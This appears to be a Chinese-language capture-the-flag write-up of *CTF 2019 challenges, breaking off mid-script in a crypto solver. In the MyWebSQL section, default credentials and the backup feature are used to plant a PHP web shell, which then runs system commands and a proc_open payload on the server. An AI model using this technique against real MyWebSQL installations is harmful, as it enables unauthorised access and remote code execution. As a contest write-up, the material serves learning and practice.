<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/blog/publi/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/blog/publi/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/blog/publi/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/blog/publi/images/apple-touch-icon_.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/blog/publi/images/favicon-32x32_.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/blog/publi/images/favicon-16x16_.png?v=5.1.3">


  <link rel="mask-icon" href="/blog/publi/images/logo_.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="CTF,赛后总结," />





  <link rel="alternate" href="/blog/publi/atom.xml" title="Ainassine's Blog" type="application/atom+xml" />






<meta name="description" content="*CTF 2019 - Writeupauthor: Ainassineteam: Zer0-D4yofficial source code: https://github.com/sixstars/starctf2019 0x00 Web - mywebsql点开题目url，是一个mywebsql的管理登录界面，条件">
<meta name="keywords" content="CTF,赛后总结">
<meta property="og:type" content="article">
<meta property="og:title" content="starctf 2019 writeup">
<meta property="og:url" content="http://blog.ainassine.cn/blog/public/2019/04/29/starctf 2019 writeup Zer0-D4y">
<meta property="og:site_name" content="Ainassine&#39;s Blog">
<meta property="og:description" content="*CTF 2019 - Writeupauthor: Ainassineteam: Zer0-D4yofficial source code: https://github.com/sixstars/starctf2019 0x00 Web - mywebsql点开题目url，是一个mywebsql的管理登录界面，条件反射测试用户名密码admin:admin，登录成功。登录后是一个数据库管理界面。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2019-05-01T05:57:54.399Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="starctf 2019 writeup">
<meta name="twitter:description" content="*CTF 2019 - Writeupauthor: Ainassineteam: Zer0-D4yofficial source code: https://github.com/sixstars/starctf2019 0x00 Web - mywebsql点开题目url，是一个mywebsql的管理登录界面，条件反射测试用户名密码admin:admin，登录成功。登录后是一个数据库管理界面。">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/blog/publi/',
    scheme: 'Muse',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://blog.ainassine.cn/blog/public/2019/04/29/starctf 2019 writeup Zer0-D4y"/>





<script>
    (function(){
        if(''){
            if (prompt('请输入文章密码') !== ''){
                alert('密码错误！');
                history.back();
            }
        }
    })();
</script>
  <title>starctf 2019 writeup | Ainassine's Blog</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?c38b095f890551bad6df876c160ff82c";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/blog/publi/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Ainassine's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">记录一切零散和琐碎。</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/blog/publi/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/blog/publi/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/blog/publi/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/blog/publi/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/blog/publi/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://blog.ainassine.cn/blog/public/blog/publi/2019/04/29/starctf 2019 writeup Zer0-D4y">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ainassine">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/blog/publi/images/1.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ainassine's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">starctf 2019 writeup</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-29T21:04:07+08:00">
                2019-04-29
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">更新于&#58;</span>
              
              <time title="更新于" itemprop="dateModified" datetime="2019-05-01T13:57:54+08:00">
                2019-05-01
              </time>
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/blog/publi/categories/CTF/" itemprop="url" rel="index">
                    <span itemprop="name">CTF</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/blog/publi/categories/CTF/赛后总结/" itemprop="url" rel="index">
                    <span itemprop="name">赛后总结</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/blog/publi/2019/04/29/starctf 2019 writeup Zer0-D4y" class="leancloud_visitors" data-flag-title="starctf 2019 writeup">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1,782 words
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  9 min
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="CTF-2019-Writeup"><a href="#CTF-2019-Writeup" class="headerlink" title="*CTF 2019 - Writeup"></a>*CTF 2019 - Writeup</h1><p>author: Ainassine<br>team: Zer0-D4y<br>official source code: <a href="https://github.com/sixstars/starctf2019" target="_blank" rel="noopener">https://github.com/sixstars/starctf2019</a></p>
<h2 id="0x00-Web-mywebsql"><a href="#0x00-Web-mywebsql" class="headerlink" title="0x00 Web - mywebsql"></a>0x00 Web - mywebsql</h2><p>点开题目url，是一个<a href="https://github.com/Samnan/MyWebSQL" target="_blank" rel="noopener">mywebsql</a>的管理登录界面，条件反射测试用户名密码admin:admin，登录成功。登录后是一个数据库管理界面。可以进行建表操作。关键是有数据库备份功能。通过github可以得到mywebsql的目录结构，经过验证，其中的backups目录我们确实可以访问，测试备份数据库表，可以指定备份文件名称，在backups目录下可以访问到。<br><strong>step 1</strong><br>构造数据表内容并通过备份生成一句话木马。数据表内容<code>*/&lt;?php eval($_GET[cmd]);?&gt;/*</code>，备份文件名设置为<code>test.php</code>。备份之后访问<code>http://targeturl/backups/test.php?cmd=echo phpinfo();</code>看到<code>phpinfo()</code>打印信息后确认第一步完成。<br><strong>step 2</strong><br>寻找flag位置。通过<code>?cmd=echo system(&#39;ls ..&#39;);</code>层级查看每个目录的内容，最终确定在系统根目录下存在文件<code>flag</code>和<code>readflag</code>。其中<code>flag</code>我们没有读权限，而我们对<code>readflag</code>有执行权限，尝试执行<code>readflag</code>得到输出，其中给出了一个算式，要求我们给出这个算式的结果才能读取flag。<br><strong>step 3</strong><br>读取flag。这里要求我们通过php与服务器上的可执行文件进行读、写的互动操作，通过查询，决定使用php的<a href="https://php.net/manual/zh/function.proc-open.php" target="_blank" rel="noopener">proc_open()</a>函数。最终构造payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://targeturl/backups/123456.php?cmd=$d=array(0=%3Earray(%22pipe%22,%22r%22),1=%3Earray(%22pipe%22,%22w%22));$fp=proc_open(%22../../../../readflag%22,$d,$pipes);$a=fgets($pipes[1]);$x=fgets($pipes[1]);$ret=eval(%22return%20$x;%22);echo%20$ret.%22%3CBR%3E%22;$emm=fwrite($pipes[0],strval($ret));echo%20$emm.%22%3CBR%3E%22;fclose($pipes[0]);$c=fgets($pipes[1]);$e=fgets($pipes[1]);echo%20$c.%20$e.%22%3CBR%3E%22;fclose($pipes[1]);proc_close($fp);</span><br></pre></td></tr></table></figure></p>
<p>成功getflag。  </p>
<h2 id="0x01-Misc-Checkin"><a href="#0x01-Misc-Checkin" class="headerlink" title="0x01 Misc - Checkin"></a>0x01 Misc - Checkin</h2><p><a href="https://webchat.freenode.net/" target="_blank" rel="noopener">Freenode</a> 输入频道号 <code>#*ctf2019</code>，在频道顶部就是flag。  </p>
<h2 id="0x02-Misc-She"><a href="#0x02-Misc-She" class="headerlink" title="0x02 Misc - She"></a>0x02 Misc - She</h2><p>下载下来是个游戏，可以利用<code>rpg maker xp</code>直接进行编辑。在游戏左下房子我们需要打败一只“野鸡？”进入到后面的关卡，这里比较麻烦，我们修改进入左下房子的事件，可以直接进入一个地牢一样的地方，地牢总共有三个房间，每个房间有三个隔间关着三只箱子。打开隔间的门需要遵从一定的顺序，经过分析，打开的顺序（按照里面箱子的号码排序）为<code>3-&gt;7-&gt;1-&gt;2-&gt;6-&gt;9</code>，打开之后可以进入最后的房间。在最后的房间，镜子会告诉你把前面看到的箱子里的数字md5编码之后就是flag。但是之前的序列编码得到的flag不正确。需要按照房间的顺序重新排序。最终数字序列似乎为<code>312679</code>（记不清了），MD5编码后放到<code>*CTF{}</code>里面提交即可。</p>
<h2 id="0x03-Misc-babyflash"><a href="#0x03-Misc-babyflash" class="headerlink" title="0x03 Misc - babyflash"></a>0x03 Misc - babyflash</h2><p>下载之后得到一个swf文件，解压获得里面的图片和音频。<br><strong>对于图片</strong><br>按照图片顺序，黑为0白为1，拼凑出0-1序列如下(脚本找不到了)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000011001110000000011111011000110111110010001010100110100010010001011011010100010010001011010010100010011111011001110111110000000010101010000000111111110101011111111000100000100000111011001001100100010000100010010000110010000100101101110011111111100000101011111011100111111111110100011001100000000010100011001010011111010010111011101010001010100100111110010001011010010001111010001010010001001110011111010100011101101000000010010011110100</span><br></pre></td></tr></table></figure></p>
<p>利用脚本将其拼成二维码，扫出一半flag为<code>*ctf{half_flag_&amp;</code>，脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">import math</span><br><span class="line">length = int(math.sqrt(441))</span><br><span class="line">im = Image.new(&apos;RGB&apos;, (length * 5, length * 5))</span><br><span class="line"></span><br><span class="line">data = &quot;000000011001110000000011111011000110111110010001010100110100010010001011011010100010010001011010010100010011111011001110111110000000010101010000000111111110101011111111000100000100000111011001001100100010000100010010000110010000100101101110011111111100000101011111011100111111111110100011001100000000010100011001010011111010010111011101010001010100100111110010001011010010001111010001010010001001110011111010100011101101000000010010011110100&quot;</span><br><span class="line"></span><br><span class="line">for x in range(length):</span><br><span class="line">    for y in range(length):</span><br><span class="line">        if data[x * length + y] == &apos;0&apos;:</span><br><span class="line">            for ii in range(x * 5, x * 5 + 5):</span><br><span class="line">                for jj in range(y * 5, y * 5 + 5):</span><br><span class="line">                    im.putpixel([ii, jj], (0,0,0))</span><br><span class="line">        else:</span><br><span class="line">            for ii in range(x * 5, x * 5 + 5):</span><br><span class="line">                for jj in range(y * 5, y * 5 + 5):</span><br><span class="line">                    im.putpixel([ii, jj], (255,255,255))</span><br><span class="line"></span><br><span class="line">im.save(&apos;out.png&apos;)</span><br></pre></td></tr></table></figure></p>
<p><strong>对于音频</strong><br>使用<code>audacity</code>转为频谱模式，可以看到<code>&amp;_the_rest}</code>字样。<br>最终 flag: *ctf{half<em>flag</em>&amp;&amp;_the_rest}</p>
<h2 id="0x04-Misc-otaku"><a href="#0x04-Misc-otaku" class="headerlink" title="0x04 Misc - otaku"></a>0x04 Misc - otaku</h2><p>拿到文件，是一个word和一个压缩包，尝试解压显示里面有一个<code>flag.png</code>和一个<code>last words.txt</code>，其中<code>last words.txt</code>显示为423字节（好像是这么长）。打开word文件，通过格式刷，发现了隐藏文字，其长度也是423字节，故联想到已知明文攻击。破解得到密码为<code>My_waifu</code>。<br>拿到图片后使用<code>stageSolve</code>，在<code>Extract data</code>工具中设置<code>R=0,G=0,B=0</code>，选择<code>Extract By Row</code>和<code>LSB First</code>，在提取信息的顶部可以看到flag。</p>
<h2 id="0x05-Crypto-babyprng-amp-babyprng2"><a href="#0x05-Crypto-babyprng-amp-babyprng2" class="headerlink" title="0x05 Crypto - babyprng &amp; babyprng2"></a>0x05 Crypto - babyprng &amp; babyprng2</h2><p>第一题解题脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brust_sha</span><span class="params">(known_part, known_whole_sha)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">                <span class="keyword">for</span> z <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">                    proof = w+x+y+z+known_part</span><br><span class="line">                    digest = sha256(proof).hexdigest()</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> digest == known_whole_sha:</span><br><span class="line">                        <span class="keyword">return</span> w+x+y+z</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = pwn.remote(<span class="string">"34.92.185.118"</span>, <span class="number">10002</span>)</span><br><span class="line">sha_code = r.recvuntil(<span class="string">"Give me XXXX:"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print sha_code</span></span><br><span class="line"></span><br><span class="line">known = sha_code[sha_code.find(<span class="string">"XXXX+"</span>)+<span class="number">5</span>: sha_code.find(<span class="string">")"</span>)]</span><br><span class="line">known_sha = sha_code.split(<span class="string">'\n'</span>)[<span class="number">0</span>].split()[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print known, known_sha</span></span><br><span class="line"></span><br><span class="line">XXXX = brust_sha(known, known_sha)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendline(XXXX)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"opcode(hex): "</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"0404000235"</span>)</span><br><span class="line"></span><br><span class="line">get_flag = r.recvline()</span><br><span class="line"><span class="keyword">print</span> get_flag</span><br></pre></td></tr></table></figure></p>
<p>第二题解题脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">get_flag = <span class="string">"&gt;.&lt;"</span></span><br><span class="line"><span class="keyword">while</span> get_flag == <span class="string">"&gt;.&lt;"</span>:</span><br><span class="line">	r = pwn.remote(<span class="string">"34.92.185.118"</span>, <span class="number">10003</span>)</span><br><span class="line">	sha_code = r.recvuntil(<span class="string">"Give me XXXX:"</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">print</span> sha_code</span><br><span class="line">	</span><br><span class="line">	known = sha_code[sha_code.find(<span class="string">"XXXX+"</span>)+<span class="number">5</span>:sha_code.find(<span class="string">")"</span>)]</span><br><span class="line">	known_sha = sha_code.split(<span class="string">'\n'</span>)[<span class="number">0</span>].split()[<span class="number">-1</span>]</span><br><span class="line">	</span><br><span class="line">	XXXX = brust_sha(known, known_sha)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">print</span> XXXX </span><br><span class="line">	</span><br><span class="line">	r.sendline(XXXX)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">"opcode(hex): "</span>)</span><br><span class="line">	</span><br><span class="line">	r.sendline(<span class="string">"0004010535"</span>)</span><br><span class="line">	</span><br><span class="line">	get_flag = r.recvline(keepends = <span class="keyword">False</span>)</span><br><span class="line">	<span class="keyword">print</span> get_flag</span><br></pre></td></tr></table></figure></p>
<h2 id="0x05-Crypto-notcurves"><a href="#0x05-Crypto-notcurves" class="headerlink" title="0x05 Crypto - notcurves"></a>0x05 Crypto - notcurves</h2><p>解题脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">nc 34.85.45.159 20005</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">primeList = []</span><br><span class="line">primeDict = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">14</span>,<span class="number">2</span>**<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">if</span> is_prime(i):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">20563</span> <span class="keyword">or</span> i == <span class="number">20707</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"BOM"</span></span><br><span class="line">        primeList.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(primeList)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(primeList)):</span><br><span class="line">        primeDict[primeList[i]*primeList[j]] = (primeList[i],primeList[j])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brust_sha</span><span class="params">(known_part, known_whole_sha)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">                <span class="keyword">for</span> z <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">                    proof = w+x+y+z+known_part</span><br><span class="line">                    digest = sha256(proof).hexdigest()</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> digest == known_whole_sha:</span><br><span class="line">                        <span class="keyword">return</span> w+x+y+z</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"><span class="comment">#    conn = remote("0.0.0.0",20005)</span></span><br><span class="line">    conn = remote(<span class="string">"34.85.45.159"</span>,<span class="number">20005</span>)</span><br><span class="line">    sha_code = conn.recvuntil(<span class="string">"Give me XXXX:"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print sha_code</span></span><br><span class="line"></span><br><span class="line">    known = sha_code[sha_code.find(<span class="string">"XXXX+"</span>)+<span class="number">5</span>: sha_code.find(<span class="string">")"</span>)]</span><br><span class="line">    known_sha = sha_code.split(<span class="string">'\n'</span>)[<span class="number">0</span>].split()[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print known, known_sha</span></span><br><span class="line"></span><br><span class="line">    XXXX = brust_sha(known, known_sha)</span><br><span class="line">    <span class="keyword">print</span> XXXX</span><br><span class="line">    conn.sendline(XXXX)</span><br><span class="line">    </span><br><span class="line">    s = conn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> s</span><br><span class="line">   </span><br><span class="line">    <span class="comment">#time.sleep(3)</span></span><br><span class="line">    tmpt = <span class="number">300000000</span></span><br><span class="line">    bit_label = <span class="number">8</span></span><br><span class="line">    lastNum = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> bit_label &gt;= <span class="number">0</span>:</span><br><span class="line">        s = conn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#        print s</span></span><br><span class="line">        s = conn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#        print s</span></span><br><span class="line">        s = conn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#        print s</span></span><br><span class="line">        s = conn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#        print s</span></span><br><span class="line">        s = conn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#       print s</span></span><br><span class="line">        s = conn.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"><span class="comment">#        print s</span></span><br><span class="line">        conn.sendline(<span class="string">"4\n"</span>)</span><br><span class="line">        s = conn.recvuntil(<span class="string">'input point A: \n'</span>)</span><br><span class="line"><span class="comment">#        print s</span></span><br><span class="line">        conn.sendline(<span class="string">"(1,3)\n"</span>)</span><br><span class="line">        s = conn.recvuntil(<span class="string">'input number t: \n'</span>)</span><br><span class="line"><span class="comment">#        print s</span></span><br><span class="line">        conn.sendline(<span class="string">"%d\n"</span>%tmpt)</span><br><span class="line">        s = conn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#        print "#",s</span></span><br><span class="line"><span class="comment">#        print s.split(':')[-1]</span></span><br><span class="line">        <span class="keyword">if</span> lastNum == <span class="string">""</span>:</span><br><span class="line">            lastNum = s.split(<span class="string">':'</span>)[<span 